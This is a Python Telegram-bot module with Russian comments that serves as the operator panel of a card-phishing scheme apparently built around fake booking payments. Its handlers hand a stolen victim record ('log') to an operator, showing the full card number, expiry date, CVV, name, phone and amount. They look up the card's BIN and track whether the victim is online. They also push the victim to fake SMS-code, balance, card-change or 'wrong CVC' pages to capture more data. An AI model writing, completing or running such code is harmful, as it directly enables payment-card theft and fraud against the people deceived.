from aiogram import Dispatcher, types, F
import httpx
import sys
import os

# Добавляем корневую директорию в путь для импортов
sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))

# Теперь импортируем наши модули
from database.crud import get_log_by_session, update_log_taken_by
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_management_keyboard, get_taken_keyboard
import config

async def take_log(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("Лог не найден", show_alert=True)
        return
        
    if log['taken_by']:
        await callback.answer("Этот лог уже занят", show_alert=True)
        return

    update_log_taken_by(session_id, callback.from_user.id)

    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "❌ Информация о карте недоступна"
    
    text = (
        f"Лог #{booking_id} || #{client_id}\n\n"
        f"💳  Карта: <code>{full_pan}</code>\n"
        f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
        f"🔒  CVV: {card.get('cvv')}\n\n"
        f"📊 <b>Информация о карте:</b>\n"
        f"{card_info_text}\n\n"
        f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
        f"📞  Номер: {customer.get('phone')}\n\n"
        f"💸  Сумма: {booking.get('total_amount')}.00 AED"
    )

    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    await callback.message.edit_reply_markup(reply_markup=get_taken_keyboard(callback.from_user.username))
    await callback.answer()

async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                booking_id = log['booking_id']
                client_id = log['client_id']
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    message = (
                        f"🆔 #{booking_id} || #{client_id}\n\n"
                        f"🟢 Пользователь ОНЛАЙН\n\n"
                        f"📍 Текущая страница: {current_page}\n"
                        f"⏰ Последняя активность: только что"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
                    last_seen = data.get("lastSeen", "неизвестно")
                    message = (
                        f"🆔 #{booking_id} || #{client_id}\n\n"
                        f"🔴 Пользователь ОФФЛАЙН\n\n"
                        f"📄 Последняя известная страница: {last_known_page}\n"
                        f"⏰ Последняя активность: {last_seen}"
                    )
                await callback.message.answer(message)
            else:
                await callback.message.answer("❌ Не удалось получить статус пользователя")
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")
    
    await callback.answer()

async def handle_redirect_action(callback: types.CallbackQuery):
    action, session_id = callback.data.split(":")
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    endpoints = {
        "balance": "/redirect-balance",
        "sms": "/redirect-sms", 
        "change": "/redirect-change",
        "success": "/redirect-success",
        "wrong_cvc": "/redirect-wrong-cvc"  # Добавляем новый эндпоинт
    }
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}{endpoints[action]}", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                messages = {
                    "balance": "✅ Пользователь перенаправлен на страницу баланса",
                    "sms": "✅ Пользователь перенаправлен на страницу ввода кода",
                    "change": "✅ Пользователь перенаправлен на страницу замены карты", 
                    "success": "✅ Успешная оплата!",
                    "wrong_cvc": "✅ Пользователь перенаправлен на страницу ввода карты заново (неверный CVC)"
                }
                await callback.message.answer(messages[action])
                
            else:
                await callback.message.answer("❌ Ошибка перенаправления")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("❌ Ошибка соединения с сервером")

def register_callbacks(dp: Dispatcher):
    dp.callback_query.register(take_log, F.data.startswith("take:"))
    dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("change:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:"))  # Добавляем новую кнопку